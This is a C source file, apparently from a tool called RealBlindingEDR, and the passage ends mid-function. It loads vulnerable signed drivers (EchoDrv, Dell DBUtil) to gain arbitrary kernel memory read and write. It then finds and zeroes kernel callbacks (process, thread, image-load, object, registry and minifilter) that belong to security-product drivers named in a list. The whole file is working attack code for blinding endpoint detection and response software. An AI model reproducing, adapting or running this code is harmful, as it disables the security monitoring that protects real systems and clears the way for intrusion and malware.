#include "RealBlindingEDR.h"
HANDLE hDevice = NULL;
HANDLE Process = NULL;
DWORD dwMajor = 0;
DWORD dwMinorVersion = 0;
DWORD dwBuild = 0;
INT64 EDRIntance[500] = { 0 };
BOOL LoadDriver() {
	HKEY hKey;
	HKEY hsubkey;
	if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet", 0, 2u, &hKey) && !RegCreateKeyW(hKey, L"RealBlindingEDR", &hsubkey)) {
		CHAR* pdata = (CHAR*)calloc(1024, 1);
		if (pdata == NULL) return FALSE;
		memcpy(pdata, "\\??\\", strlen("\\??\\"));
		memcpy(pdata + strlen("\\??\\"), DrivePath, strlen(DrivePath));
		if (RegSetValueExA(hsubkey, "ImagePath", 0, REG_EXPAND_SZ, (PBYTE)pdata, (DWORD)(strlen(pdata) + 1))) {
			printf("Step1 Error\n");
			return FALSE;
		}
		BYTE bDwod[4] = { 0 };
		*(DWORD*)bDwod = 1;
		if (RegSetValueExA(hsubkey, "Type", 0, 4u, bDwod, 4u)) {
			printf("Step2 Error\n");
			return FALSE;
		}

		if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\services", 0, 2u, &hKey)) {
			RegCreateKeyW(hKey, L"RealBlindingEDR", &hsubkey);
		}
		else {
			printf("Step3 Error\n");
			return FALSE;
		}
		RegCloseKey(hKey);

		INT errcode;

		HMODULE hMoudle = LoadLibraryA("ntdll.dll");
		if (hMoudle == NULL) {
			printf("Step4 Error\n");
			return FALSE;
		}
		RtlInitUnicodeStringPtr RtlInitUnicodeString = (RtlInitUnicodeStringPtr)GetProcAddress(hMoudle, "RtlInitUnicodeString");
		NtLoadDriverPtr NtLoadDriver = (NtLoadDriverPtr)GetProcAddress(hMoudle, "NtLoadDriver");
		RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hMoudle, "RtlAdjustPrivilege");
		ULONG previousState;
		NTSTATUS status = RtlAdjustPrivilege(0xa, TRUE, FALSE, &previousState);

		if (!NT_SUCCESS(status)) {
			printf("Step5 Error\n");
			return FALSE;
		}

		UNICODE_STRING szSymbolicLink;
		RtlInitUnicodeString(&szSymbolicLink, (wchar_t*)L"\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
		errcode = NtLoadDriver(&szSymbolicLink);
		if (errcode >= 0)
		{
			return TRUE;
		}
		else
		{
			printf("Error Code: % lx\n", errcode);
			return FALSE;
		}

	}
	else {
		printf("Reg Add Error!\n");
		return FALSE;
	}
}
VOID UnloadDrive() {
	HMODULE hMoudle = LoadLibraryA("ntdll.dll");
	if (hMoudle == NULL) {
		printf("Unload Driver Error 1\n");
		return;
	}
	RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hMoudle, "RtlAdjustPrivilege");
	ULONG previousState;
	NTSTATUS status = RtlAdjustPrivilege(0xa, TRUE, FALSE, &previousState);
	if (!NT_SUCCESS(status)) {
		printf("Unload Driver Error 2\n");
		return;
	}

	RtlInitUnicodeStringPtr RtlInitUnicodeString = (RtlInitUnicodeStringPtr)GetProcAddress(hMoudle, "RtlInitUnicodeString");
	UNICODE_STRING szSymbolicLink;
	RtlInitUnicodeString(&szSymbolicLink, (wchar_t*)L"\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
	NtUnLoadDriverPtr NtUnLoadDriver = (NtUnLoadDriverPtr)GetProcAddress(hMoudle, "NtUnloadDriver");

	int errcode = NtUnLoadDriver(&szSymbolicLink);
	if (errcode >= 0)
	{
		printf("Driver uninstalled successfully.\n");
	}
	else {
		printf("Unload Driver Error: %lx\n", errcode);
	}
}
BOOL InitialDriver() {
	//win7 加载此驱动崩溃，和后面代码逻辑无关
	if (DriverType == 1) {
		hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			if (LoadDriver()) {
				printf("Driver loaded successfully.\n");
				hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			}
			else {
				printf("Driver loading failed.\n");
				return FALSE;
			}
		}

		BYTE* buf = (BYTE*)malloc(4096);
		DWORD bytesRet = 0;
		BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 4096, &bytesRet, NULL);
		if (!success) {
			printf("Failed to initialize driver 1, %d\n", GetLastError());
			CloseHandle(hDevice);
			return FALSE;
		}
		GetHandle* param = (GetHandle*)calloc(sizeof(GetHandle), 1);
		param->pid = GetCurrentProcessId();
		param->access = GENERIC_ALL;
		success = DeviceIoControl(hDevice, 0xe6224248, param, sizeof(param), param, sizeof(param), &bytesRet, NULL);
		if (!success) {
			printf("Failed to initialize driver 2, %d\n", GetLastError());
			CloseHandle(hDevice);
			return FALSE;
		}
		Process = param->handle;
	}
	else if (DriverType == 2) {
		hDevice = CreateFile(L"\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			if (LoadDriver()) {
				printf("Driver loaded successfully.\n");
				hDevice = CreateFile(L"\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			}
			else {
				printf("Driver loading failed.\n");
				return FALSE;
			}
		}
	}
	return TRUE;
}

DWORD64 DellRead(VOID* Address) {
	struct DellBuff ReadBuff = {};
	ReadBuff.Address = (DWORD64)Address;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDevice, 0x9B0C1EC4, &ReadBuff, sizeof(ReadBuff), &ReadBuff, sizeof(ReadBuff), &BytesRead, NULL);
	if (!success) {
		printf("Memory read failed. 1\n");
		CloseHandle(hDevice);
	}

	//printf("%d\n", BytesRead);
	return ReadBuff.value;
}
VOID DellWrite(VOID* Address, LONGLONG value) {
	struct DellBuff WriteBuff = {};
	WriteBuff.Address = (DWORD64)Address;
	WriteBuff.value = value;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDevice, 0x9B0C1EC8, &WriteBuff, sizeof(WriteBuff), &WriteBuff, sizeof(WriteBuff), &BytesRead, NULL);
	if (!success) {
		printf("Memory read failed. 2\n");
		CloseHandle(hDevice);
	}

	//printf("%d\n", BytesRead);
}
VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
	if (DriverType == 1) {
		ReadMem* req = (ReadMem*)malloc(sizeof(ReadMem));
		req->fromAddress = fromAddress;
		req->length = len;
		req->targetProcess = Process;
		req->toAddress = toAddress;
		DWORD bytesRet = 0;
		BOOL success = DeviceIoControl(hDevice, 0x60a26124, req, sizeof(ReadMem), req, sizeof(ReadMem), &bytesRet, NULL);
		if (!success) {
			printf("Memory read failed.\n");
			CloseHandle(hDevice);
		}
	}
	else if (DriverType == 2) {
		if (len == 8) {
			INT64* InttoAddress = (INT64*)toAddress;
			INT64 dataAddr = DellRead(fromAddress);
			DellWrite(toAddress, dataAddr);
		}
		else {
			BYTE* btoAddress = (BYTE*)toAddress;
			for (size_t i = 0; i < len; i++) {
				btoAddress[i] = (BYTE)DellRead((VOID*)((DWORD64)fromAddress + i));
			}
		}
	}
}

BOOL IsEDR(CHAR* DriverName) {
	DWORD isEDR = FALSE;
	INT i = 0;
	while (AVDriver[i] != NULL) {
		if (stricmp(DriverName, AVDriver[i]) == 0) {
			isEDR = TRUE;
			break;
		}
		i++;
	}
	return isEDR;
}

PVOID GetModuleBase(CHAR* Name) {
	PRTL_PROCESS_MODULES ModuleInfo = (PRTL_PROCESS_MODULES)calloc(1024 * 1024, 1);
	if (ModuleInfo == NULL) return 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, ModuleInfo, 1024 * 1024, NULL);
	if (!NT_SUCCESS(status)) {
		return 0;
	}

	for (ULONG i = 0; i < ModuleInfo->NumberOfModules; i++)
	{
		if (lstrcmpiA((LPCSTR)(ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName), Name) == 0) {

			return ModuleInfo->Modules[i].ImageBase;
		}
	}
	return 0;
}
INT64 GetFuncAddress(CHAR* ModuleName, CHAR* FuncName) {
	PVOID KBase = GetModuleBase(ModuleName);
	if (KBase == 0) {
		printf("ntoskrnl.exe base address not found.\n");
		return 0;
	}
	HMODULE ntos = NULL;
	if (strcmp(ModuleName, "FLTMGR.sys") == 0) {
		CHAR FullModuleName[100] = "C:\\windows\\system32\\drivers\\";
		lstrcatA(FullModuleName, ModuleName);
		ntos = LoadLibraryExA(FullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	}
	else {
		ntos = LoadLibraryA(ModuleName);
	}
	if (ntos == NULL) return 0;
	VOID* PocAddress = (VOID*)GetProcAddress(ntos, FuncName);
	INT64 Offset = (INT64)PocAddress - (INT64)ntos;
	return (INT64)KBase + Offset;
}


INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {

	INT64 PsSetCallbacksNotifyRoutineAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", KernelCallbackRegFunc);
	if (PsSetCallbacksNotifyRoutineAddress == 0) return 0;

	INT count = 0;
	INT64 PspSetCallbackssNotifyRoutineAddress = 0;
	UINT64 PspOffset = 0;
	BYTE* buffer = (BYTE*)malloc(1);
	if (buffer == NULL) return 0;
	if (dwMajor >= 10 || (dwMajor == 6 && strcmp(KernelCallbackRegFunc, "PsSetCreateProcessNotifyRoutine") == 0)) {
		while (1) {
			DriverWriteMemery((VOID*)PsSetCallbacksNotifyRoutineAddress, buffer, 1);
			if (*buffer == 0xE8 || *buffer == 0xE9) {
				break;
			}
			PsSetCallbacksNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + 1;
			if (count == 200) {
				printf("%s: The first level CALL/JMP instruction was not found.\n", KernelCallbackRegFunc);
				return 0;
			}
			count++;
		}

		for (int i = 4, k = 24; i > 0; i--, k = k - 8) {

			DriverWriteMemery((VOID*)(PsSetCallbacksNotifyRoutineAddress + i), buffer, 1);
			PspOffset = ((UINT64)*buffer << k) + PspOffset;
		}
		if ((PspOffset & 0x00000000ff000000) == 0x00000000ff000000)
			PspOffset = PspOffset | 0xffffffff00000000; 

		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + PspOffset + 5;
		//printf("PspSetCallbackssNotifyRoutineAddress: %I64x\n", PspSetCallbackssNotifyRoutineAddress);
		
	}
	else if (dwMajor == 6) {
		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress;
	}
	else {
		printf("Unsupported operating system version.\n");
		return 0;
	}
	
	BYTE SearchByte1 = 0x4C;
	BYTE SearchByte1_1 = 0x48;
	BYTE SearchByte2 = 0x8D;
	BYTE bArray[3] = { 0 };
	count = 0;
	while (count <= 200) {
		DriverWriteMemery((VOID*)PspSetCallbackssNotifyRoutineAddress, bArray, 3);
		if (bArray[0] == SearchByte1 && bArray[1] == SearchByte2) {
			if ((bArray[2] == 0x0D) || (bArray[2] == 0x15) || (bArray[2] == 0x1D) || (bArray[2] == 0x25) || (bArray[2] == 0x2D) || (bArray[2] == 0x35) || (bArray[2] == 0x3D))
			{
				break;
			}
		}
		else if (bArray[0] == SearchByte1_1 && bArray[1] == SearchByte2) { //2008R2
			if ((bArray[2] == 0x0D) || (bArray[2] == 0x15) || (bArray[2] == 0x1D) || (bArray[2] == 0x25) || (bArray[2] == 0x2D) || (bArray[2] == 0x35) || (bArray[2] == 0x3D))
			{
				break;
			}
		}

		PspSetCallbackssNotifyRoutineAddress = PspSetCallbackssNotifyRoutineAddress + 1;
		if (count == 200)
		{
			printf("%s:The second level LEA instruction was not found and the PspSetCallbackssNotifyRoutineAddress array could not be located.\n", KernelCallbackRegFunc);
			return 0;
		}
		count++;
	}
	//printf("PspSetCallbackssNotifyRoutineAddress:%I64x\n", PspSetCallbackssNotifyRoutineAddress);
	PspOffset = 0;
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(PspSetCallbackssNotifyRoutineAddress + i), buffer, 1);
		PspOffset = ((UINT64)*buffer << k) + PspOffset;
	}
	if ((PspOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PspOffset = PspOffset | 0xffffffff00000000;

	INT64 PspNotifyRoutineArrayAddress = PspSetCallbackssNotifyRoutineAddress + PspOffset + 7;

	return PspNotifyRoutineArrayAddress;
}
CHAR* GetDriverName(INT64 DriverCallBackFuncAddr) {
	DWORD bytesNeeded = 0;
	if (EnumDeviceDrivers(NULL, 0, &bytesNeeded)) {
		DWORD ArraySize = bytesNeeded / 8;
		DWORD ArraySizeByte = bytesNeeded;
		INT64* addressArray = (INT64*)malloc(ArraySizeByte);
		if (addressArray == NULL) return NULL;
		EnumDeviceDrivers((LPVOID*)addressArray, ArraySizeByte, &bytesNeeded);
		INT64* ArrayMatch = (INT64*)malloc(ArraySizeByte + 100);
		if (ArrayMatch == NULL) return NULL;
		INT j = 0;
		for (DWORD i = 0; i < ArraySize - 1; i++) {
			// && (DriverCallBackFuncAddr < addressArray[i + 1])
			if ((DriverCallBackFuncAddr > (INT64)addressArray[i])) {
				ArrayMatch[j] = addressArray[i];
				j++;
			}
		}
		INT64 tmp = 0;
		INT64 MatchAddr = 0;
		for (int i = 0; i < j; i++) {
			if (i == 0) {
				tmp = _abs64(DriverCallBackFuncAddr - ArrayMatch[i]);
				MatchAddr = ArrayMatch[i];

			}
			else if (_abs64(DriverCallBackFuncAddr - ArrayMatch[i]) < tmp) {
				tmp = _abs64(DriverCallBackFuncAddr - ArrayMatch[i]);
				MatchAddr = ArrayMatch[i];
			}
		}

		CHAR* DriverName = (CHAR*)calloc(1024, 1);
		if (GetDeviceDriverBaseNameA((LPVOID)MatchAddr, DriverName, 1024) > 0) {
			//printf("%I64x\t%s", MatchAddr,DriverName);
			return DriverName;

		}
		free(addressArray);
		free(ArrayMatch);
		free(DriverName);
	}
	return NULL;
}
VOID PrintAndClearCallBack(INT64 PspNotifyRoutineAddress, CHAR* CallBackRegFunc) {
	INT64 buffer = 0;
	printf("----------------------------------------------------\n");
	printf("Register driver for %s callback: \n----------------------------------------------------\n\n", CallBackRegFunc);
	BYTE* data = (BYTE*)calloc(8, 1);
	for (int k = 0; k < 64; k++)
	{
		DriverWriteMemery((VOID*)(PspNotifyRoutineAddress + (k * 8)), &buffer, 8);
		if (buffer == 0) continue;
		INT64 tmpaddr = ((INT64)buffer >> 4) << 4;
		if (tmpaddr == 0) continue;
		DriverWriteMemery((VOID*)(tmpaddr + 8), &buffer, 8);
		INT64 DriverCallBackFuncAddr = (INT64)buffer;
		CHAR* DriverName = GetDriverName(DriverCallBackFuncAddr);
		if (DriverName != NULL) {
			printf("%s", DriverName);
			if (IsEDR(DriverName)) {
				DriverWriteMemery(data, (VOID*)(PspNotifyRoutineAddress + (k * 8)), 8);
				printf("\t[Clear]\n");
			}
			else {
				printf("\n");
			}
		}
	}
	printf("\n");
}
VOID ClearThreeCallBack() {
	INT64 PspCreateProcessNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateProcessNotifyRoutine");
	INT64 PspCreateThreadNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateThreadNotifyRoutine");
	INT64 PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetLoadImageNotifyRoutine");

	//printf("PspCreateProcessNotifyRoutineAddress: %I64x\n", PspCreateProcessNotifyRoutineAddress);
	//printf("PspCreateThreadNotifyRoutineAddress: %I64x\n", PspCreateThreadNotifyRoutineAddress);
	//printf("PspLoadImageNotifyRoutineAddress: %I64x\n", PspLoadImageNotifyRoutineAddress);

	if (PspCreateProcessNotifyRoutineAddress) {
		PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, (CHAR*)"PsSetCreateProcessNotifyRoutine");
	}
	else {
		printf("Failed to obtain process callback address.\n");
	}
	if (PspCreateThreadNotifyRoutineAddress) {
		PrintAndClearCallBack(PspCreateThreadNotifyRoutineAddress, (CHAR*)"PsSetCreateThreadNotifyRoutine");
	}
	else {
		printf("Failed to obtain thread callback address.\n");
	}
	if (PspLoadImageNotifyRoutineAddress) {
		PrintAndClearCallBack(PspLoadImageNotifyRoutineAddress, (CHAR*)"PsSetLoadImageNotifyRoutine");
	}
	else {
		printf("Image loading callback address acquisition failed.\n");
	}

	return;

}

INT64 GetPsProcessAndProcessTypeAddr(INT flag) {
	INT64 FuncAddress = 0;
	if (flag == 1) {
		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtDuplicateObject");
	}
	else if (flag == 2) {
		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtOpenThreadTokenEx");
	}
	if (FuncAddress == 0) return 0;

	BYTE* buffer = (BYTE*)calloc(3, 1);
	if (buffer == 0) return 0;
	INT count = 0;
	while (1) {
		DriverWriteMemery((VOID*)FuncAddress, buffer, 3);
		if (buffer[0] == 0x4c && buffer[1] == 0x8b && buffer[2] == 0x05) {
			break;
		}
		FuncAddress = FuncAddress + 1;
		if (count == 300) {
			printf("PsProcessTyped or PsThreadType address not found.\n");
			return 0;
		}
		count++;
	}
	UINT64 PsOffset = 0;
	BYTE tmp[1] = { 0 };
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(FuncAddress + i), tmp, 1);
		PsOffset = ((UINT64)tmp[0] << k) + PsOffset;
	}
	if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PsOffset = PsOffset | 0xffffffff00000000;
	INT64 PsProcessTypePtr = FuncAddress + 7 + PsOffset;
	INT64 PsProcessTypeAddr = 0;
	DriverWriteMemery((VOID*)PsProcessTypePtr, &PsProcessTypeAddr, 8);
	return PsProcessTypeAddr;

	return 0;
}
VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
	INT64 CallbackListAddr = 0;
	if (dwMajor >= 10) {
		CallbackListAddr = PsProcessTypeAddr + 0xC8;
	}
	else if (dwMajor == 6) {
		if (dwMinorVersion == 3) {//2012R2
			CallbackListAddr = PsProcessTypeAddr + 0xC8;
		}
		else {
			CallbackListAddr = PsProcessTypeAddr + 0xC0;
		}
		
	}
	else {
		printf("Operating systems not supported by ObRegisterCallbacks.\n");
		return;
	}


	INT64 Flink = 0;
	DriverWriteMemery((VOID*)CallbackListAddr, &Flink, 8);

	INT64 Blink = 0;
	DriverWriteMemery((VOID*)(CallbackListAddr + 8), &Blink, 8);

	INT Count = 1;
	INT64 tFlink = Flink;
	do {
		Count++;
		INT64 temp = 0;
		DriverWriteMemery((VOID*)(tFlink), &temp, 8);
		tFlink = temp;
	} while (tFlink != Blink);
	BYTE* data = (BYTE*)calloc(8, 1);
	if (data == NULL) return;

	for (INT i = 0; i < Count; i++) {

		INT64 EDRPreOperation = 0;
		DriverWriteMemery((VOID*)(Flink + 40), &EDRPreOperation, 8);
		INT64 EDRPostOperation = 0;
		DriverWriteMemery((VOID*)(Flink + 48), &EDRPostOperation, 8);
		//printf("%s: EDRPreOperation: %I64x , %s: EDRPostOperation: %I64x \n", GetDriverName(EDRPreOperation), EDRPreOperation, GetDriverName(EDRPostOperation), EDRPostOperation);
		CHAR* DriverName1 = GetDriverName(EDRPreOperation);
		if (DriverName1 != NULL) {
			if (IsEDR(DriverName1)) {
				DriverWriteMemery(data, (VOID*)(Flink + 40), 8);
				if (flag == 1) {
					printf("Process PreOperation: %s [Clear]\n", DriverName1);
				}
				else if (flag == 2) {
					printf("Thread PreOperation: %s [Clear]\n", DriverName1);
				}
			}
			else {
				if (flag == 1) {
					printf("Process PreOperation: %s\n", DriverName1);
				}
				else if (flag == 2) {
					printf("Thread PreOperation: %s\n", DriverName1);
				}
			}
		}
		CHAR* DriverName2 = GetDriverName(EDRPostOperation);
		if (DriverName2 != NULL) {
			if (IsEDR(DriverName2)) {
				//清除回调
				DriverWriteMemery(data, (VOID*)(Flink + 48), 8);
				if (flag == 1) {
					printf("Process PreOperation: %s [Clear]\n", DriverName2);
				}
				else if (flag == 2) {
					printf("Thread PreOperation: %s [Clear]\n", DriverName2);
				}
			}
			else {
				if (flag == 1) {
					printf("Process PreOperation: %s\n", DriverName2);
				}
				else if (flag == 2) {
					printf("Thread PreOperation: %s\n", DriverName2);
				}
			}
		}
		printf("\n\n");
		INT64 temp = 0;
		DriverWriteMemery((VOID*)(Flink), &temp, 8);
		Flink = temp;

	}
}
VOID ClearObRegisterCallbacks() {

	INT64 PsProcessTypeAddr = GetPsProcessAndProcessTypeAddr(1);
	if (PsProcessTypeAddr == 0) {
		printf("Failed to obtain PsProcessTypeAddr.\n");
		return;
	}
	INT64 PsThreadTypeAddr = GetPsProcessAndProcessTypeAddr(2);
	if (PsThreadTypeAddr == 0) {
		printf("Failed to obtain PsThreadTypetypeAddr.\n");
		return;
	}
	printf("----------------------------------------------------\n");
	printf("Drivers that register ObRegisterCallbacks callbacks: \n----------------------------------------------------\n\n");

	/*printf("PsProcessTypeAddr: %I64x\n", PsProcessTypeAddr);
	printf("PsThreadTypeAddr: %I64x\n", PsThreadTypeAddr);*/
	RemoveObRegisterCallbacks(PsProcessTypeAddr, 1);
	RemoveObRegisterCallbacks(PsThreadTypeAddr, 2);

	return;
}

VOID ClearCmRegisterCallback() {
	INT64 CmUnRegisterCallbackAddr = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"CmUnRegisterCallback");
	if (CmUnRegisterCallbackAddr == 0) return;
	BYTE* buffer = (BYTE*)calloc(3, 1);
	if (buffer == 0) return;
	INT count = 0;

	while (1) {
		DriverWriteMemery((VOID*)CmUnRegisterCallbackAddr, buffer, 3);

		if (buffer[0] == 0x48 && buffer[1] == 0x8d && buffer[2] == 0x0D) {
			BYTE tmp[3] = { 0 };
			DriverWriteMemery((VOID*)(CmUnRegisterCallbackAddr - 5), tmp, 3);
			if (tmp[0] == 0x48 && tmp[1] == 0x8d && tmp[2] == 0x54) {
				break;
			}
		}
		CmUnRegisterCallbackAddr = CmUnRegisterCallbackAddr + 1;
		if (count == 300) {
			printf("CmUnRegisterCallback address not found.\n");
			return;
		}
		count++;
	}
	printf("----------------------------------------------------\n");
	printf("Register the CmRegisterCallback callback driver: \n----------------------------------------------------\n\n[Clear all below]\n");
	//printf("CmUnRegisterCallbackAddr: %I64X\n", CmUnRegisterCallbackAddr);
	UINT64 PsOffset = 0;

	BYTE tmp[1] = { 0 };
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(CmUnRegisterCallbackAddr + i), tmp, 1);
		PsOffset = ((UINT64)tmp[0] << k) + PsOffset;
	}
	if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PsOffset = PsOffset | 0xffffffff00000000;

	INT64 CallbackListHeadptr = CmUnRegisterCallbackAddr + 7 + PsOffset;
	//printf("%I64x\n", CallbackListHeadptr);

	INT64 CallbackListHeadAddr = 0;
	DriverWriteMemery((VOID*)CallbackListHeadptr, &CallbackListHeadAddr, 8);

	INT64 First = CallbackListHeadAddr;

	do {

		INT64 CallBackFuncAddr = 0;
		DriverWriteMemery((VOID*)(CallbackListHeadAddr + 0x28), &CallBackFuncAddr, 8);
		CHAR* DriverName = GetDriverName(CallBackFuncAddr);
		if (DriverName != NULL) {
			printf("%s\n", DriverName);
		}

		INT64 tmp = 0;
		DriverWriteMemery((VOID*)(CallbackListHeadAddr), &tmp, 8);
		CallbackListHeadAddr = tmp;
	} while (First != CallbackListHeadAddr);

	DriverWriteMemery(&CallbackListHeadptr, (VOID*)CallbackListHeadptr, 8);

}

VOID AddEDRIntance(INT64 IntanceAddr) {
	INT i = 0;
	while (EDRIntance[i] != 0) {
		i++;
	}
	EDRIntance[i] = IntanceAddr;
}
CHAR* ReadDriverName(INT64 FLT_FILTERAddr) {
	
	INT Offset = 0;
	if (dwMajor == 10) {
		Offset = 0x38;
	}
	else if (dwMajor == 6) {
		Offset = 0x28;
	}
	else {
		printf("Windows system version not supported yet.");
		exit(0);
	}
	USHORT FilerNameLen = 0;
	DriverWriteMemery((VOID*)(FLT_FILTERAddr + Offset + 2), &FilerNameLen, 2);
	if (FilerNameLen == 0) return NULL;

	INT64 FilterNameAddr = 0;
	DriverWriteMemery((VOID*)(FLT_FILTERAddr + Offset + 8), &FilterNameAddr, 8);

	TCHAR* FilterName = (TCHAR*)calloc(FilerNameLen+50, 1);
	if (FilterName == NULL) return NULL;
	DriverWriteMemery((VOID*)FilterNameAddr, FilterName, FilerNameLen);

	CHAR* FilterNameA = (CHAR*)calloc(FilerNameLen + 10, 1);
	if (FilterNameA == 0) return NULL;
	wcstombs(FilterNameA, FilterName, FilerNameLen);

	lstrcatA(FilterNameA, ".sys");
	return FilterNameA;
}
BOOL IsEDRIntance(INT j, INT64 Flink) {
	Flink += 0x10;
	INT64 InstanceAddr = 0;
	DriverWriteMemery((VOID*)Flink, &InstanceAddr, 8);

	INT k = 0;
	BOOL Flag = 0;
	while (EDRIntance[k] != 0) {
		if (EDRIntance[k] == InstanceAddr) Flag = 1;
		k++;
	}
	if (!Flag) return Flag;

	if (dwMajor == 10) {
		InstanceAddr += 0x40;
	}
	else if (dwMajor == 6) {
		InstanceAddr += 0x30;
	}
	else {
		printf("Windows system version not supported yet.");
		exit(0);
	}
	
	INT64 FilterAddr = 0;
	DriverWriteMemery((VOID*)InstanceAddr, &FilterAddr, 8);

	CHAR* FilterName = ReadDriverName(FilterAddr);
	if (FilterName == NULL) return 0;
	printf("\t\t[%d] %s : %I64x [Clear]\n", j, FilterName, Flink - 0x10);//_CALLBACK_NODE

	//printf("EDRIntance: %d\n", k);
	return Flag;
}
VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
	INT64 FilterInstanceAddr = 0;

	if (dwMajor == 10) {
		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xD0), &FilterInstanceAddr, 8); //0x68 + 0x68
	}
	else if (dwMajor == 6) {
		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xC0), &FilterInstanceAddr, 8); //0x58+0x68
	}
	else {
		printf("Windows system version not supported yet.");
		exit(0);
	}

	INT64 FirstLink = FilterInstanceAddr;
	INT64 data = 0;

	INT count = 0;
	do {
		count++;
		INT64 tmpAddr = 0;
		DriverWriteMemery((VOID*)(FilterInstanceAddr), &tmpAddr, 8);
		FilterInstanceAddr = tmpAddr;
	} while (FirstLink != FilterInstanceAddr);
	//printf("\t\t%d\n",count);
	count--;
	INT i = 0;
	do {
		INT Offset = 0;
		if (dwMajor == 10) {
			Offset = 0x70;
		}
		else if (dwMajor == 6) {
			Offset = 0x60;
		}
		else {
			printf("Windows system version not supported yet.");
			exit(0);
		}
		FilterInstanceAddr -= Offset;
		printf("\t\tFLT_INSTANCE 0x%I64x\n", FilterInstanceAddr);
		AddEDRIntance(FilterInstanceAddr);

		for (INT i = 0; i < 50; i++) {
			INT64 CallbackNodeData = 0;
			INT offset = 0;
			if (dwMajor == 10 && dwBuild < 22000) offset = 0xa0;
			else if (dwMajor == 10 && dwBuild >= 22000) offset = 0xa8;
			else if (dwMajor == 6) offset = 0x90;
			else {
				printf("Windows system version not supported yet.");
				exit(0);
			}
			DriverWriteMemery((VOID*)(FilterInstanceAddr + offset + i * 8), &CallbackNodeData, 8);
			if (CallbackNodeData != 0) {
				printf("\t\t\t[%d] : 0x%I64x\t[Clear]\n", i, CallbackNodeData);
				DriverWriteMemery(&data, (VOID*)(FilterInstanceAddr + offset + i * 8), 8);
			}
		}

		INT64 tmpAddr = 0;
		DriverWriteMemery((VOID*)(FilterInstanceAddr + Offset), &tmpAddr, 8);
		FilterInstanceAddr = tmpAddr;
		i++;
	} while (i < count);
}
VOID ClearMiniFilterCallback() {
	printf("\n\n----------------------------------------------------\n");
	printf("Register MiniFilter Callback driver: \n----------------------------------------------------\n\n");
	INT64 FltEnumerateFiltersAddr = GetFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
	if (FltEnumerateFiltersAddr == 0) {
		printf("FltEnumerateFilters function address not found.\n");
		return;
	}
	BYTE* buffer = (BYTE*)calloc(3, 1);
	if (buffer == 0) return;
	INT count = 0;


	while (1) {
		DriverWriteMemery((VOID*)FltEnumerateFiltersAddr, buffer, 3);

		if (buffer[0] == 0x48 && buffer[1] == 0x8d && buffer[2] == 0x05) {
			break;
		}
		FltEnumerateFiltersAddr = FltEnumerateFiltersAddr + 1;
		if (count == 300) {
			printf("FltGlobals structure address not found.\n");
			return;
		}
		count++;
	}
	//printf("%I64x\n", FltEnumerateFiltersAddr);

	UINT64 PsOffset = 0;

	BYTE tmp[1] = { 0 };
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(FltEnumerateFiltersAddr + i), tmp, 1);
		PsOffset = ((UINT64)tmp[0] << k) + PsOffset;
	}
	if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PsOffset = PsOffset | 0xffffffff00000000;
	INT64 FrameAddrPTR = FltEnumerateFiltersAddr + 7 + PsOffset;

	INT64 FLT_FRAMEAddr = 0;
	DriverWriteMemery((VOID*)FrameAddrPTR, &FLT_FRAMEAddr, 8);
	FLT_FRAMEAddr -= 0x8;
